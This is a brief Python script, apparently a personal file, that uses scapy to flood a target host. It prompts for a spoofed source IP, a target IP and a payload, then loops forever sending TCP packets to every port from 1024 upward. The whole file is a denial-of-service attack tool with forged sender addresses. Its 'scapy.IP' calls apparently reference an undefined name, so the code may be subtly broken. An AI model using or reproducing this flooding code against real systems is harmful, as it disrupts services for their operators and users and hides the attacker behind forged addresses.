'''
Created on 3 Jun 2021

@author: adam
'''
#!/usr/bin/python3

from scapy.all import *

def syn_flood(src,tgt,message):
    for dport in range(1024, 65535):
        IPlayer = scapy.IP(src=src, dst=tgt)
        TCPlayer = scapy.TCP(sport=4444, dport=dport)
        RAWlayer = scapy.Raw(load=message)
        pkt = IPlayer/TCPlayer/RAWlayer
        send(pkt)
        
source = input("[*] Enter source IP Address to Fake ")
target = input("[*] Enter target IP Address ")
message = input("[*] Enter message for TCP pay load ")

while True:
    syn_flood(source, target, message)